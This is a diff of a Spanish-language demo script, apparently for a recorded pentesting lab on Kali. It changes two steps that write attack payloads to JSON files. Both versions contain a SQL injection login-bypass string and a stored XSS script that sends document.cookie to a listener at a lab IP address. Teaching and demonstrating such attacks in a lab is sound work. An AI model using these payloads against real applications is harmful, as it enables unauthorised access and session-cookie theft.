@@ -68,12 +68,10 @@
 
 ### PASO 2.1: Creación del payload de Inyección SQL (`payload_sqli.json`)
 
-* 🖥️ **Acción Visual:** En la terminal de Kali, creas directamente el archivo JSON que contendrá el payload de SQLi.
+* 🖥️ **Acción Visual:** En la terminal de Kali, creas directamente el archivo JSON con el payload de SQLi y lo verificas.
 * ⌨️ **Comando a escribir:**
   ```bash
-  cat << 'EOF' > payload_sqli.json
-  {"username": "' OR 1=1 OR '1'='1", "password": "x"}
-  EOF
+  echo '{"username": "'\'' OR 1=1 OR '\''1'\''='\''1", "password": "x"}' > payload_sqli.json
   cat payload_sqli.json
   ```
 * 🗣️ **Lo que dices mientras tipeas el comando y muestras el archivo `payload_sqli.json`:**
@@ -109,12 +107,10 @@
 
 ### PASO 2.4: Creación del payload de Stored XSS (`payload_xss.json`)
 
-* 🖥️ **Acción Visual:** Creas el archivo con el script XSS autorreplicante y exfiltrador.
+* 🖥️ **Acción Visual:** Creas el archivo JSON con el script XSS usando un comando de una sola línea.
 * ⌨️ **Comando a escribir:**
   ```bash
-  cat << 'EOF' > payload_xss.json
-  {"receiverId": 1, "content": "<script>fetch('http://192.168.56.10:8888/?c='+encodeURIComponent(document.cookie),{mode:'no-cors'});</script>"}
-  EOF
+  echo '{"receiverId": 1, "content": "<script>fetch(\"http://192.168.56.10:8888/?c=\"+encodeURIComponent(document.cookie),{mode:\"no-cors\"});</script>"}' > payload_xss.json
   cat payload_xss.json
   ```
 * 🗣️ **Lo que dices mientras tipeas y muestras `payload_xss.json`:**
